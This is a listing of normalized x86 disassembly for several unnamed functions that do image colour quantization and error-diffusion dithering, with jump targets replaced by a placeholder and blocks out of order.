mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
xor edx edx
mov dl [ ecx ]
sar edx 0x3
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x1c ]
shl ecx 0x6
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + edx * 4 ]
add edx ecx
mov eax [ ebp - 0x20 ]
lea ecx [ edx + eax * 2 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
xor eax eax
mov ax [ edx ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x1
mov [ ebp - 0x24 ] eax
mov edx [ ebp - 0x14 ]
xor eax eax
mov ax [ edx ]
sub eax 0x1
mov ecx [ ebp - 0x10 ]
mov [ ecx ] al
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov ecx [ ebp - 0x20 ]
push ecx
mov edx [ ebp - 0x1c ]
push edx
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_427ce0
add esp 0x10
mov eax [ ebp - 0x28 ]
sub eax 0x1
mov [ ebp - 0x28 ] eax
sub_427ce0
push ebp
mov ebp esp
sub esp 0x1ec
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a8 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x18 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0xc ]
sar ecx 0x2
mov [ ebp + 0xc ] ecx
mov edx [ ebp + 0x10 ]
sar edx 0x3
mov [ ebp + 0x10 ] edx
mov eax [ ebp + 0x14 ]
sar eax 0x2
mov [ ebp + 0x14 ] eax
mov ecx [ ebp + 0xc ]
shl ecx 0x5
add ecx 0x4
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x10 ]
shl edx 0x5
add edx 0x2
mov [ ebp - 0x10 ] edx
mov eax [ ebp + 0x14 ]
shl eax 0x5
add eax 0x4
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x128 ]
push ecx
mov edx [ ebp - 0x14 ]
push edx
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_427e50
add esp 0x14
mov [ ebp - 0x12c ] eax
lea eax [ ebp - 0x1ac ]
push eax
lea ecx [ ebp - 0x128 ]
push ecx
mov edx [ ebp - 0x12c ]
push edx
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
mov edx [ ebp - 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_428190
add esp 0x1c
mov ecx [ ebp + 0xc ]
shl ecx 0x2
mov [ ebp + 0xc ] ecx
mov edx [ ebp + 0x10 ]
shl edx 0x3
mov [ ebp + 0x10 ] edx
mov eax [ ebp + 0x14 ]
shl eax 0x2
mov [ ebp + 0x14 ] eax
lea ecx [ ebp - 0x1ac ]
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
cmp [ ebp - 0x18 ] 0x4
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
cmp [ ebp - 0x1c ] 0x8
jge r-xdata
jmp r-xdata
mov ecx [ ebp + 0xc ]
add ecx [ ebp - 0x18 ]
mov edx [ ebp + 0x10 ]
add edx [ ebp - 0x1c ]
shl edx 0x6
mov eax [ ebp - 0x8 ]
mov ecx [ eax + ecx * 4 ]
add ecx edx
mov edx [ ebp + 0x14 ]
lea eax [ ecx + edx * 2 ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x20 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
cmp [ ebp - 0x20 ] 0x4
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x24 ]
xor eax eax
mov al [ edx ]
add eax 0x1
mov ecx [ ebp - 0x28 ]
mov [ ecx ] ax
mov edx [ ebp - 0x28 ]
add edx 0x2
mov [ ebp - 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x1
mov [ ebp - 0x24 ] eax
jmp r-xdata
mov eax [ ebp - 0x1c ]
add eax 0x1
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
sub_427e50
push ebp
mov ebp esp
sub esp 0x478
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x70 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0xc ]
add edx 0x18
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0xc ]
add eax [ ebp - 0x8 ]
sar eax 0x1
mov [ ebp - 0x14 ] eax
mov ecx [ ebp + 0x10 ]
add ecx 0x1c
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x10 ]
add edx [ ebp - 0xc ]
sar edx 0x1
mov [ ebp - 0x18 ] edx
mov eax [ ebp + 0x14 ]
add eax 0x18
mov [ ebp - 0x10 ] eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebp - 0x10 ]
sar ecx 0x1
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x2c ] 0x7fffffff
mov [ ebp - 0x20 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x20 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x74 ]
mov eax [ edx ]
mov ecx [ ebp - 0x20 ]
xor edx edx
mov dl [ eax + ecx ]
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x24 ]
cmp eax [ ebp + 0xc ]
jge r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov edx [ ebp - 0x24 ]
cmp edx [ ebp - 0x8 ]
jle r-xdata
mov ecx [ ebp - 0x24 ]
sub ecx [ ebp + 0xc ]
shl ecx 0x1
mov [ ebp - 0x38 ] ecx
mov edx [ ebp - 0x38 ]
imul edx [ ebp - 0x38 ]
mov [ ebp - 0x30 ] edx
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x8 ]
shl eax 0x1
mov [ ebp - 0x38 ] eax
mov ecx [ ebp - 0x38 ]
imul ecx [ ebp - 0x38 ]
mov [ ebp - 0x34 ] ecx
jmp r-xdata
mov eax [ ebp - 0x28 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x20 ]
mov edx [ ebp + ecx * 4 - 0x438 ]
cmp edx [ ebp - 0x2c ]
jg r-xdata
mov [ ebp - 0x30 ] 0x0
mov ecx [ ebp - 0x24 ]
cmp ecx [ ebp - 0x14 ]
jg r-xdata
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x8 ]
shl eax 0x1
mov [ ebp - 0x38 ] eax
mov ecx [ ebp - 0x38 ]
imul ecx [ ebp - 0x38 ]
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x24 ]
sub edx [ ebp + 0xc ]
shl edx 0x1
mov [ ebp - 0x38 ] edx
mov eax [ ebp - 0x38 ]
imul eax [ ebp - 0x38 ]
mov [ ebp - 0x34 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x74 ]
mov edx [ ecx + 0x4 ]
mov eax [ ebp - 0x20 ]
xor ecx ecx
mov cl [ edx + eax ]
mov [ ebp - 0x24 ] ecx
mov edx [ ebp - 0x24 ]
cmp edx [ ebp + 0x10 ]
jge r-xdata
jmp r-xdata
mov eax [ ebp + 0x18 ]
add eax [ ebp - 0x28 ]
mov cl [ ebp - 0x20 ]
mov [ eax ] cl
mov edx [ ebp - 0x28 ]
add edx 0x1
mov [ ebp - 0x28 ] edx
mov ecx [ ebp - 0x24 ]
sub ecx [ ebp + 0xc ]
shl ecx 0x1
mov [ ebp - 0x38 ] ecx
mov edx [ ebp - 0x38 ]
imul edx [ ebp - 0x38 ]
mov [ ebp - 0x34 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x8 ]
shl edx 0x1
mov [ ebp - 0x38 ] edx
mov eax [ ebp - 0x38 ]
imul eax [ ebp - 0x38 ]
mov [ ebp - 0x34 ] eax
jmp r-xdata
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ ebp - 0x24 ]
sub eax [ ebp + 0x10 ]
imul eax eax 0x3
mov [ ebp - 0x38 ] eax
mov ecx [ ebp - 0x38 ]
imul ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x30 ]
add edx ecx
mov [ ebp - 0x30 ] edx
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0xc ]
imul eax eax 0x3
mov [ ebp - 0x38 ] eax
mov ecx [ ebp - 0x38 ]
imul ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x34 ]
add edx ecx
mov [ ebp - 0x34 ] edx
jmp r-xdata
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov ecx [ ebp - 0x24 ]
cmp ecx [ ebp - 0x18 ]
jg r-xdata
mov ecx [ ebp - 0x24 ]
sub ecx [ ebp - 0xc ]
imul ecx ecx 0x3
mov [ ebp - 0x38 ] ecx
mov edx [ ebp - 0x38 ]
imul edx [ ebp - 0x38 ]
mov eax [ ebp - 0x30 ]
add eax edx
mov [ ebp - 0x30 ] eax
mov ecx [ ebp - 0x24 ]
sub ecx [ ebp + 0x10 ]
imul ecx ecx 0x3
mov [ ebp - 0x38 ] ecx
mov edx [ ebp - 0x38 ]
imul edx [ ebp - 0x38 ]
mov eax [ ebp - 0x34 ]
add eax edx
mov [ ebp - 0x34 ] eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x74 ]
mov ecx [ eax + 0x8 ]
mov edx [ ebp - 0x20 ]
xor eax eax
mov al [ ecx + edx ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x24 ]
cmp ecx [ ebp + 0x14 ]
jge r-xdata
mov edx [ ebp - 0x24 ]
sub edx [ ebp + 0x10 ]
imul edx edx 0x3
mov [ ebp - 0x38 ] edx
mov eax [ ebp - 0x38 ]
imul eax [ ebp - 0x38 ]
mov ecx [ ebp - 0x34 ]
add ecx eax
mov [ ebp - 0x34 ] ecx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0xc ]
imul edx edx 0x3
mov [ ebp - 0x38 ] edx
mov eax [ ebp - 0x38 ]
imul eax [ ebp - 0x38 ]
mov ecx [ ebp - 0x34 ]
add ecx eax
mov [ ebp - 0x34 ] ecx
jmp r-xdata
mov edx [ ebp - 0x24 ]
cmp edx [ ebp - 0x10 ]
jle r-xdata
mov edx [ ebp - 0x24 ]
sub edx [ ebp + 0x14 ]
mov [ ebp - 0x38 ] edx
mov eax [ ebp - 0x38 ]
imul eax [ ebp - 0x38 ]
mov ecx [ ebp - 0x30 ]
add ecx eax
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x10 ]
mov [ ebp - 0x38 ] edx
mov eax [ ebp - 0x38 ]
imul eax [ ebp - 0x38 ]
mov ecx [ ebp - 0x34 ]
add ecx eax
mov [ ebp - 0x34 ] ecx
jmp r-xdata
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x38 ] eax
mov ecx [ ebp - 0x38 ]
imul ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x30 ]
add edx ecx
mov [ ebp - 0x30 ] edx
mov eax [ ebp - 0x24 ]
sub eax [ ebp + 0x14 ]
mov [ ebp - 0x38 ] eax
mov ecx [ ebp - 0x38 ]
imul ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x34 ]
add edx ecx
mov [ ebp - 0x34 ] edx
jmp r-xdata
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x30 ]
mov [ ebp + ecx * 4 - 0x438 ] edx
mov eax [ ebp - 0x34 ]
cmp eax [ ebp - 0x2c ]
jge r-xdata
mov ecx [ ebp - 0x24 ]
sub ecx [ ebp + 0x14 ]
mov [ ebp - 0x38 ] ecx
mov edx [ ebp - 0x38 ]
imul edx [ ebp - 0x38 ]
mov eax [ ebp - 0x34 ]
add eax edx
mov [ ebp - 0x34 ] eax
mov ecx [ ebp - 0x24 ]
sub ecx [ ebp - 0x10 ]
mov [ ebp - 0x38 ] ecx
mov edx [ ebp - 0x38 ]
imul edx [ ebp - 0x38 ]
mov eax [ ebp - 0x34 ]
add eax edx
mov [ ebp - 0x34 ] eax
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x34 ]
mov [ ebp - 0x2c ] ecx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
sub_428190
push ebp
mov ebp esp
sub esp 0x280
push ebx
push esi
push edi
lea eax [ ebp - 0x240 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x10 ] 0x7f
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x18 ]
mov [ edx ] 0x7fffffff
mov eax [ ebp - 0x18 ]
add eax 0x4
mov [ ebp - 0x18 ] eax
jmp r-xdata
mov edx [ ebp - 0x10 ]
cmp edx [ ebp + 0x18 ]
jge r-xdata
mov ecx [ ebp - 0x10 ]
sub ecx 0x1
mov [ ebp - 0x10 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x1c ]
add eax [ ebp - 0x10 ]
xor ecx ecx
mov cl [ eax ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x74 ]
mov ecx [ eax ]
mov edx [ ebp - 0x14 ]
xor eax eax
mov al [ ecx + edx ]
mov ecx [ ebp + 0xc ]
sub ecx eax
shl ecx 0x1
mov [ ebp - 0x38 ] ecx
mov edx [ ebp - 0x38 ]
imul edx [ ebp - 0x38 ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x74 ]
mov edx [ ecx + 0x4 ]
mov eax [ ebp - 0x14 ]
xor ecx ecx
mov cl [ edx + eax ]
mov edx [ ebp + 0x10 ]
sub edx ecx
imul edx edx 0x3
mov [ ebp - 0x3c ] edx
mov eax [ ebp - 0x3c ]
imul eax [ ebp - 0x3c ]
mov ecx [ ebp - 0x20 ]
add ecx eax
mov [ ebp - 0x20 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x74 ]
mov ecx [ eax + 0x8 ]
mov edx [ ebp - 0x14 ]
xor eax eax
mov al [ ecx + edx ]
mov ecx [ ebp + 0x14 ]
sub ecx eax
mov [ ebp - 0x40 ] ecx
mov edx [ ebp - 0x40 ]
imul edx [ ebp - 0x40 ]
mov eax [ ebp - 0x20 ]
add eax edx
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x38 ]
shl ecx 0x5
add ecx 0x100
mov [ ebp - 0x38 ] ecx
mov edx [ ebp - 0x3c ]
imul edx edx 0x18
add edx 0x90
mov [ ebp - 0x3c ] edx
mov eax [ ebp - 0x40 ]
shl eax 0x4
add eax 0x40
mov [ ebp - 0x40 ] eax
lea ecx [ ebp - 0x240 ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp + 0x20 ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x4 ] 0x3
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
jmp r-xdata
mov edx [ ebp - 0x20 ]
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x8 ] 0x7
jmp r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
mov edx [ ebp - 0x20 ]
add edx [ ebp - 0x2c ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x2c ]
add eax 0x200
mov [ ebp - 0x2c ] eax
jmp r-xdata
mov edx [ ebp - 0x24 ]
mov [ ebp - 0x28 ] edx
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0xc ] 0x3
jmp r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx 0x1
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0xc ] 0x0
jl r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x30 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x30 ]
add ecx 0x120
mov [ ebp - 0x30 ] ecx
jmp r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x28 ]
cmp eax [ edx ]
jge r-xdata
mov ecx [ ebp - 0x8 ]
sub ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x28 ]
add edx [ ebp - 0x34 ]
mov [ ebp - 0x28 ] edx
mov eax [ ebp - 0x34 ]
add eax 0x80
mov [ ebp - 0x34 ] eax
mov ecx [ ebp - 0x18 ]
add ecx 0x4
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x1c ]
add edx 0x1
mov [ ebp - 0x1c ] edx
jmp r-xdata
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x28 ]
mov [ ecx ] edx
mov eax [ ebp - 0x1c ]
mov cl [ ebp - 0x14 ]
mov [ eax ] cl
mov ecx [ ebp - 0xc ]
sub ecx 0x1
mov [ ebp - 0xc ] ecx
sub_4283a0
push ebp
mov ebp esp
sub esp 0xb0
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a8 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x18 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x5c ]
mov [ ebp - 0x50 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x120 ]
mov [ ebp - 0x54 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x28 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x74 ]
mov eax [ edx ]
mov [ ebp - 0x5c ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x74 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x60 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x74 ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x48 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x48 ]
cmp edx [ ebp + 0x14 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x48 ]
mov ecx [ ebp + 0xc ]
mov edx [ ecx + eax * 4 ]
mov [ ebp - 0x34 ] edx
mov eax [ ebp - 0x48 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ecx + eax * 4 ]
mov [ ebp - 0x38 ] edx
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov cl [ eax + 0x24 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x40 ] 0x1
mov [ ebp - 0x44 ] 0x3
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x20 ]
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x24 ] 0x1
mov edx [ ebp - 0x50 ]
sub edx 0x1
imul edx edx 0x3
mov eax [ ebp - 0x34 ]
add eax edx
mov [ ebp - 0x34 ] eax
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x38 ]
lea eax [ edx + ecx - 0x1 ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x40 ] 0xffffffff
mov [ ebp - 0x44 ] 0xfffffffd
mov ecx [ ebp - 0x50 ]
add ecx 0x1
imul ecx ecx 0x3
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x20 ]
lea ecx [ eax + ecx * 2 ]
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x24 ] 0x0
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x20 ] 0x0
mov edx [ ebp - 0x20 ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x2c ] 0x0
mov ecx [ ebp - 0x2c ]
mov [ ebp - 0x28 ] ecx
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
jmp r-xdata
mov edx [ ebp - 0x30 ]
mov ax [ ebp - 0x24 ]
mov [ edx ] ax
mov ecx [ ebp - 0x30 ]
mov dx [ ebp - 0x28 ]
mov [ ecx + 0x2 ] dx
mov eax [ ebp - 0x30 ]
mov cx [ ebp - 0x2c ]
mov [ eax + 0x4 ] cx
jmp r-xdata
mov edx [ ebp - 0x44 ]
mov eax [ ebp - 0x30 ]
movsx ecx [ eax + edx * 2 ]
mov edx [ ebp - 0xc ]
lea eax [ edx + ecx + 0x8 ]
sar eax 0x4
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x44 ]
mov edx [ ebp - 0x30 ]
movsx eax [ edx + ecx * 2 + 0x2 ]
mov ecx [ ebp - 0x10 ]
lea edx [ ecx + eax + 0x8 ]
sar edx 0x4
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x44 ]
mov ecx [ ebp - 0x30 ]
movsx edx [ ecx + eax * 2 + 0x4 ]
mov eax [ ebp - 0x14 ]
lea ecx [ eax + edx + 0x8 ]
sar ecx 0x4
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x58 ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x58 ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x58 ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x34 ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0xc ]
add ecx eax
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x34 ]
xor eax eax
mov al [ edx + 0x1 ]
mov ecx [ ebp - 0x10 ]
add ecx eax
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x34 ]
xor eax eax
mov al [ edx + 0x2 ]
mov ecx [ ebp - 0x14 ]
add ecx eax
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x54 ]
add edx [ ebp - 0xc ]
xor eax eax
mov al [ edx ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x54 ]
add ecx [ ebp - 0x10 ]
xor edx edx
mov dl [ ecx ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x54 ]
add eax [ ebp - 0x14 ]
xor ecx ecx
mov cl [ eax ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0xc ]
sar edx 0x3
mov eax [ ebp - 0x10 ]
sar eax 0x2
shl eax 0x6
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + edx * 4 ]
add edx eax
mov eax [ ebp - 0x14 ]
sar eax 0x3
lea ecx [ edx + eax * 2 ]
mov [ ebp - 0x3c ] ecx
mov edx [ ebp - 0x3c ]
xor eax eax
mov ax [ edx ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x48 ]
add ecx 0x1
mov [ ebp - 0x48 ] ecx
mov edx [ ebp - 0x3c ]
xor eax eax
mov ax [ edx ]
sub eax 0x1
mov [ ebp - 0x68 ] eax
mov ecx [ ebp - 0x38 ]
mov dl [ ebp - 0x68 ]
mov [ ecx ] dl
mov eax [ ebp - 0x5c ]
add eax [ ebp - 0x68 ]
xor ecx ecx
mov cl [ eax ]
mov edx [ ebp - 0xc ]
sub edx ecx
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x60 ]
add eax [ ebp - 0x68 ]
xor ecx ecx
mov cl [ eax ]
mov edx [ ebp - 0x10 ]
sub edx ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x64 ]
add eax [ ebp - 0x68 ]
xor ecx ecx
mov cl [ eax ]
mov edx [ ebp - 0x14 ]
sub edx ecx
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
mov [ ebp - 0x6c ] eax
mov ecx [ ebp - 0xc ]
shl ecx 0x1
mov [ ebp - 0x70 ] ecx
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x70 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0xc ]
mov ecx [ ebp - 0x30 ]
mov [ ecx ] ax
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x70 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x6c ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x70 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x6c ] eax
mov ecx [ ebp - 0x10 ]
shl ecx 0x1
mov [ ebp - 0x70 ] ecx
mov edx [ ebp - 0x10 ]
add edx [ ebp - 0x70 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x30 ]
mov [ ecx + 0x2 ] ax
mov edx [ ebp - 0x10 ]
add edx [ ebp - 0x70 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x6c ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x10 ]
add edx [ ebp - 0x70 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x6c ] eax
mov ecx [ ebp - 0x14 ]
shl ecx 0x1
mov [ ebp - 0x70 ] ecx
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x70 ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x30 ]
mov [ ecx + 0x4 ] ax
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x70 ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x14 ]
mov [ ebp - 0x2c ] eax
mov ecx [ ebp - 0x6c ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x70 ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x34 ]
add eax [ ebp - 0x44 ]
mov [ ebp - 0x34 ] eax
mov ecx [ ebp - 0x38 ]
add ecx [ ebp - 0x40 ]
mov [ ebp - 0x38 ] ecx
mov edx [ ebp - 0x44 ]
mov eax [ ebp - 0x30 ]
lea ecx [ eax + edx * 2 ]
mov [ ebp - 0x30 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
sar ecx 0x3
push ecx
mov edx [ ebp - 0x10 ]
sar edx 0x2
push edx
mov eax [ ebp - 0xc ]
sar eax 0x3
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_427ce0
add esp 0x10
mov ecx [ ebp - 0x4c ]
sub ecx 0x1
mov [ ebp - 0x4c ] ecx
sub_428780
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a8 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
mov [ edx + 0x74 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x14 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4287d0
add esp 0x8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4287d0
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
shl eax 0x5
push eax
push 0x1
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
call [ eax ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] 0x1f
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0xc ] 0x3f
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] 0x1f
